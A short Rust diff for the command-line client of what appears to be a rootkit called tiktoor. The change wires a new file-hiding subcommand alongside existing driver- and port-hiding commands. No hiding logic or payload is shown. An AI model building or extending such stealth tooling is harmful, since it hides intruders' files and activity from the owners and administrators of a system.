@@ -11,7 +11,11 @@ enum Cli {
         name: String,
     },
     /// Hide file
-    FileHiding,
+    FileHiding {
+        /// file name
+        #[structopt(short, long)]
+        name: String,
+    },
     /// Hide port
     PortHiding {
         #[structopt(subcommand)]
@@ -66,7 +70,11 @@ fn main() {
                 tiktoor_client::hide_driver(&name)
             }
         }
-        Cli::FileHiding => {}
+        Cli::FileHiding { name } => {
+            if let Ok(name) = CString::new(name) {
+                tiktoor_client::hide_file(&name)
+            }
+        }
         Cli::PortHiding {
             transmission_type,
             port,
